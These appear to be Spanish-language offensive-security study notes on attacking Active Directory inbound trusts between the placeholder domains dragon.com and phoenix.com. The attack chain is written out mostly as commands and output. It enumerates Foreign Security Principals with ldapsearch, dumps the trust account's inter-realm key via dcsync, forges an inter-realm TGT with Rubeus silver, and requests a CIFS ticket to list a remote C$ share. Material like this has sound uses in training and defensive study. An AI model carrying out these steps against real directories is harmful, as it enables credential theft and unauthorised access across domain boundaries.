#### 🔀 Inbound Trusts (confianza de entrada)

Una confianza de un solo sentido se crea cuando un dominio quiere compartir sus recursos con otro, pero **no al revés**.

```
┌─────────────────────────────────────────────────────────┐
│  dragon.com (trusted)  →→→  phoenix.com (trusting)      │
│                                                         │
│  dragon puede acceder                                   │
│  a recursos de phoenix  +                               │
│                                                         │
│  phoenix NO puede acceder                               │
│  a recursos de dragon   x                               │
└─────────────────────────────────────────────────────────┘
```

Enumerando el TDO desde dragon.com:

```
ldapsearch (objectClass=trustedDomain)

name:           phoenix.com
trustDirection: 1          ← inbound (solo dragon accede a phoenix)
trustAttributes: 8         ← external trust (no transitiva)
flatName:       PHOENIX
```

---

#### ⚠️ SID Filtering: por qué no funcionan Golden Tickets aquí

```
┌─────────────────────────────────────────────────────────┐
│  En parent/child:                                       │
│  Golden Ticket + SID History + funciona                 │
│                                                         │
│  En external/inbound trusts:                            │
│  SID Filtering activo → phoenix.com IGNORA cualquier    │
│  SID que no sea nativo de su propio dominio x           │
└─────────────────────────────────────────────────────────┘
```

---

#### 🔍 Estrategia: Foreign Security Principals

En lugar de forjar tickets, buscamos **usuarios de dragon.com que ya tienen acceso legítimo en phoenix.com**.

AD tiene un contenedor especial llamado **Foreign Security Principals** que registra exactamente eso:

```
ldapsearch (objectClass=foreignSecurityPrincipal)
           --hostname phoenix.com
           --dn DC=phoenix,DC=com

--------------------
cn: S-1-5-4     ← default, no interesa
cn: S-1-5-9     ← default, no interesa
cn: S-1-5-11    ← default, no interesa
cn: S-1-5-17    ← default, no interesa
--------------------
cn: S-1-5-21-XXXX-XXXX-XXXX-6102
memberOf: CN=Phoenix Users,CN=Users,DC=phoenix,DC=com
```

Ese SID pertenece a dragon.com, lo consultamos:

```
ldapsearch (objectSid=S-1-5-21-XXXX-XXXX-XXXX-6102)

cn: Dragon Jump Users
member: CN=Merlin,CN=Users,DC=dragon,DC=com
sAMAccountName: Dragon Jump Users
sAMAccountType: 268435456  ← es un grupo
```

```
┌─────────────────────────────────────────────────────────┐
│  Lo que hemos descubierto:                              │
│                                                         │
│  Grupo "Dragon Jump Users" en dragon.com                │
│      └► miembro: Merlin                                 │
│      └► es miembro de "Phoenix Users" en phoenix.com    │
│                                                         │
│  Si comprometemos a Merlin → acceso a phoenix.com +     │
└─────────────────────────────────────────────────────────┘
```

---

#### 🎫 Forjando Referral Tickets manualmente

Si tenemos credenciales de un principal elegible, podemos forjar el inter-realm TGT manualmente usando la **inter-realm key**.

**Paso 1:** Obtener la inter-realm key haciendo dcsync de la trust account:

```
dcsync dragon.com DRAGON\PHOENIX$

Hash NTLM: [inter-realm key en RC4]
aes256_hmac: [inter-realm key en AES256]
```

**Paso 2:** Forjar el inter-realm TGT con Rubeus silver:

```
Rubeus.exe silver

  /user:merlin                ← usuario a suplantar
  /domain:DRAGON.COM          ← dominio trusted (el nuestro)
  /sid:[SID de dragon.com]    ← SID del dominio trusted
  /id:[RID de merlin]         ← RID del usuario suplantado
  /groups:513,6102            ← grupos del usuario
                                513 = Domain Users
                                6102 = Dragon Jump Users
  /service:krbtgt/phoenix.com ← servicio krbtgt del dominio trusting
  /rc4:[hash NTLM PHOENIX$]   ← inter-realm key (RC4 por defecto)
  /nowrap
```

```
┌─────────────────────────────────────────────────────────┐
│  !  Los trusts usan RC4 por defecto incluso en          │
│  versiones modernas de Windows → usar hash NTLM         │
│                                                         │
│  !  Asegurarse de poner los grupos correctos del        │
│  usuario, no los que Rubeus pone por defecto            │
│  Alternativa: usar /ldap para que los obtenga solo      │
└─────────────────────────────────────────────────────────┘
```

**Paso 3:** Usar el inter-realm TGT para pedir un ticket de servicio en phoenix.com:

```
Rubeus.exe asktgs

  /service:cifs/maquina.phoenix.com  ← servicio al que queremos acceder
  /dc:dc.phoenix.com                 ← DC del dominio trusting
  /ticket:[inter-realm TGT]          ← ticket forjado en el paso anterior
  /nowrap
```

**Resultado:**

```
  dragon.com (trusted)              phoenix.com (trusting)
       │                                    │
       │  merlin tiene inter-realm TGT      │
       │──────── asktgs ───────────────────►│
       │                                    │
       │◄─────── ticket cifs/maquina ───────│
       │                                    │
       │  ls \\maquina.phoenix.com\c$ +     │
```
